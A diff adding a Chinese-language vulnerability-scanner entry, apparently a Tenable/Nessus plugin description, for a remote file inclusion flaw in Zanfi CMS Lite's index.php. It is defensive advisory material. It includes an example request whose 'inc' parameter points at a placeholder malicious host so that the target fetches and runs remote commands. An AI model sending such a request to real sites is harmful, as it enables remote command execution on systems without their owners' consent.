@@ -1,0 +1,8 @@
+[CHINESE]
+ID=15452
+NAME=Zanfi CMS Lite远程文件包含漏洞
+CATEGORY=信息搜集
+FAMILY=CGI漏洞
+SUMMARY=检查Zanfi CMS是否可以包含第三方文件
+DESCRIPTION=远程主机正在运行Zanfi CMS Lite--一个PHP编写的内容管理系统.;;此软件在'index.php'文件中存在一个文件包含漏洞，攻击者可利用这个漏洞在远程主机上执行任意命令.;;攻击者通过请求:;;	http://www.example.com/index.php?inc=http://[恶意站点]/commands;;;将使远程脚本包含commands.php并执行，从而导致执行任意命令.;;;解决方案 : 升级到此软件的最新版本;风险等级 : 高
+COPYRIGHT=This script is Copyright (C) 2004 Tenable Network Security
